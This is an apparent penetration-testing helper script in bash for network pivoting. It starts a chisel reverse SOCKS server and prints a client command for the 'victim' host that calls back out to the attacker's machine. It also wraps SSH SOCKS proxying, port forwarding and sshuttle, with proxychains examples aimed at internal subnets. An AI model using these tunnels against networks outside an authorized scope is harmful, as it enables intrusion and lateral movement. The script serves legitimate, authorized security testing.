#!/usr/bin/env bash
#
# pivot.sh - tunneling / pivoting helper
# -----------------------------------------------------------------------------
# Sets up the attacker side of a pivot and prints the matching victim-side
# command, for the methods available on this image:
#   chisel-server  : start a chisel reverse server (run the client on the victim
#                    to expose an internal SOCKS proxy back to you).
#   socks          : SSH dynamic SOCKS proxy through a host you already own.
#   fwd            : SSH local port-forward (reach one internal service).
#   sshuttle       : transparent "VPN-like" routing of a subnet over SSH.
# After a SOCKS proxy is up, use tools through it via proxychains.
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY: pivot only through/into in-scope networks.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./pivot.sh chisel-server [-p <port>]                       # then run printed client cmd on victim
#   ./pivot.sh socks  -i <ssh_host> -u <user> [-P <socks_port>]
#   ./pivot.sh fwd    -i <ssh_host> -u <user> -L <lport:inhost:inport>
#   ./pivot.sh sshuttle -i <ssh_host> -u <user> -N <subnet/CIDR>
#
# EXAMPLES:
#   ./pivot.sh chisel-server -p 8080
#   ./pivot.sh socks -i 10.10.10.5 -u root -P 1080      # proxychains nxc smb 172.16.0.0/24
#   ./pivot.sh fwd  -i 10.10.10.5 -u root -L 13389:172.16.0.9:3389
#
# DEPENDENCIES: chisel (installed) ; ssh / sshuttle for the SSH-based modes.
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_hdr(){  printf '\n\033[1;36m# %s\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }
myip(){ ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}' || hostname -I | awk '{print $1}'; }

MODE="${1:-}"; shift || true
PORT="" SSH_HOST="" USER="" SOCKS=1080 FWD="" SUBNET=""
while getopts "p:i:u:P:L:N:h" o; do case "$o" in
  p) PORT=$OPTARG;; i) SSH_HOST=$OPTARG;; u) USER=$OPTARG;; P) SOCKS=$OPTARG;;
  L) FWD=$OPTARG;; N) SUBNET=$OPTARG;; *) sed -n '2,30p' "$0"; exit 1;;
esac; done

case "$MODE" in
  chisel-server)
    have chisel || { c_err "chisel not installed"; exit 1; }
    PORT=${PORT:-8080}; IP=$(myip)
    c_hdr "Run this on the VICTIM (pushes a SOCKS proxy back to you)"
    echo "  chisel client $IP:$PORT R:socks"
    c_info "Then point tools at socks5://127.0.0.1:1080 (set in /etc/proxychains4.conf)."
    c_ok "Starting chisel reverse server on :$PORT (Ctrl-C to stop)"
    exec chisel server -p "$PORT" --reverse;;
  socks)
    [ -z "$SSH_HOST" ] || [ -z "$USER" ] && { c_err "socks needs -i and -u"; exit 1; }
    c_ok "SSH dynamic SOCKS on 127.0.0.1:$SOCKS via $USER@$SSH_HOST"
    c_info "Use it: add 'socks5 127.0.0.1 $SOCKS' to /etc/proxychains4.conf, then 'proxychains <tool>'"
    exec ssh -N -D "127.0.0.1:$SOCKS" "$USER@$SSH_HOST";;
  fwd)
    [ -z "$SSH_HOST" ] || [ -z "$USER" ] || [ -z "$FWD" ] && { c_err "fwd needs -i -u -L lport:host:port"; exit 1; }
    c_ok "Local forward $FWD via $USER@$SSH_HOST  (reach 127.0.0.1:${FWD%%:*})"
    exec ssh -N -L "$FWD" "$USER@$SSH_HOST";;
  sshuttle)
    [ -z "$SSH_HOST" ] || [ -z "$USER" ] || [ -z "$SUBNET" ] && { c_err "sshuttle needs -i -u -N subnet"; exit 1; }
    have sshuttle || { c_err "sshuttle not installed (sudo apt install sshuttle)"; exit 1; }
    c_ok "Routing $SUBNET through $USER@$SSH_HOST (transparent)"
    exec sshuttle -r "$USER@$SSH_HOST" "$SUBNET";;
  *) sed -n '2,30p' "$0"; exit 1;;
esac
